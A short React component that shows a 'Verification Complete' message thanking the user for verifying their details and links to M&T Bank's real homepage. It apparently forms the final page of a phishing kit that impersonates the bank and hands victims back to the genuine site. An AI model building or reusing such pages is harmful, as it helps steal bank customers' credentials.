import { Link } from "react-router-dom";

export default function Grats() {
  return (
    <>
      <br />
      <br />
      <br />
      <h2 style={{ textAlign: "center" }}>Verification Complete</h2>
      <p style={{ textAlign: "center" }}>
        Thank you for verifying your details with us, You'll be redirected to
        the home page.
      </p>
      <p style={{ textAlign: "center" }}>
        {" "}
        <Link to={"https://www3.mtb.com/"}>Go home</Link>{" "}
      </p>
      <br />
      <br />
      <br />
    </>
  );
}
